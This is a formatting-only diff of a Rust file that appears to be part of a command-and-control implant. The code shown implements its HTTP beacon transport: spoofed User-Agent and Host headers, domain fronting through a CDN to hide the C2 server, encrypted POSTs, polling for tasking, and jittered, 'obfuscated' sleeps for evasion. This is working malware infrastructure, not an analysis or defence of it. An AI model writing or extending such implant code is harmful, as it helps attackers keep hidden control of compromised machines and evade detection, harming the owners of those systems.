@@ -1,7 +1,7 @@
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
-use common::{Message, Transport, CryptoSession};
 use common::config::MalleableProfile;
+use common::{CryptoSession, Message, Transport};
 use tokio::time::Duration;
 
 pub struct HttpTransport {
@@ -17,9 +17,15 @@ impl HttpTransport {
 
         // Malleable profile headers
         let mut headers = reqwest::header::HeaderMap::new();
-        headers.insert(reqwest::header::USER_AGENT, reqwest::header::HeaderValue::from_str(&profile.user_agent)?);
+        headers.insert(
+            reqwest::header::USER_AGENT,
+            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
+        );
         if !profile.host_header.is_empty() {
-            headers.insert(reqwest::header::HOST, reqwest::header::HeaderValue::from_str(&profile.host_header)?);
+            headers.insert(
+                reqwest::header::HOST,
+                reqwest::header::HeaderValue::from_str(&profile.host_header)?,
+            );
         }
 
         // Build HTTP client with rustls and custom headers
@@ -35,7 +41,10 @@ impl HttpTransport {
         })
     }
 
-    async fn connect_with_retry(&self, req_builder: reqwest::RequestBuilder) -> Result<reqwest::Response> {
+    async fn connect_with_retry(
+        &self,
+        req_builder: reqwest::RequestBuilder,
+    ) -> Result<reqwest::Response> {
         let mut delay = 1;
         let mut attempt = 0u32;
         const MAX_ATTEMPTS: u32 = 8;
@@ -49,11 +58,21 @@ impl HttpTransport {
             let current_delay = (delay as f64 * jitter) as u64;
 
             // Clone builder since we might retry
-            match req_builder.try_clone().ok_or_else(|| anyhow!("Failed to clone request"))?.send().await {
+            match req_builder
+                .try_clone()
+                .ok_or_else(|| anyhow!("Failed to clone request"))?
+                .send()
+                .await
+            {
                 Ok(resp) => return Ok(resp),
                 Err(e) => {
-                    log::warn!("HTTP connection failed: {}. Retrying in {}s...", e, current_delay);
-                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None).await?;
+                    log::warn!(
+                        "HTTP connection failed: {}. Retrying in {}s...",
+                        e,
+                        current_delay
+                    );
+                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None)
+                        .await?;
                     delay *= 2;
                     if delay > 64 {
                         delay = 64;
@@ -67,7 +86,10 @@ impl HttpTransport {
 #[async_trait]
 impl Transport for HttpTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
-        log::debug!("Malleable HTTP C2 Send with profile User-Agent: {}", self.profile.user_agent);
+        log::debug!(
+            "Malleable HTTP C2 Send with profile User-Agent: {}",
+            self.profile.user_agent
+        );
 
         let endpoint = if self.profile.cdn_relay {
             // Domain-fronting: connect to CDN IP/host, Host header points to C2.
@@ -85,15 +107,18 @@ impl Transport for HttpTransport {
         let ciphertext = self.session.encrypt(&serialized);
 
         // POST request
-        let req = self.client.post(format!("{}{}", endpoint, self.profile.uri)).body(ciphertext);
+        let req = self
+            .client
+            .post(format!("{}{}", endpoint, self.profile.uri))
+            .body(ciphertext);
         let resp = self.connect_with_retry(req).await?;
         if !resp.status().is_success() {
             anyhow::bail!("C2 POST returned HTTP {}", resp.status());
         }
-        
+
         Ok(())
     }
-    
+
     async fn recv(&mut self) -> Result<Message> {
         log::debug!("Malleable HTTP C2 Recv polling via GET");
 
@@ -113,7 +138,9 @@ impl Transport for HttpTransport {
         if bytes.is_empty() {
             // No tasking: sleep with jitter then signal the caller with a Heartbeat
             // so the main loop continues rather than treating this as a transport error.
-            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(&common::config::SleepConfig::default());
+            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(
+                &common::config::SleepConfig::default(),
+            );
             crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
             return Ok(Message::Heartbeat {
                 timestamp: std::time::SystemTime::now()
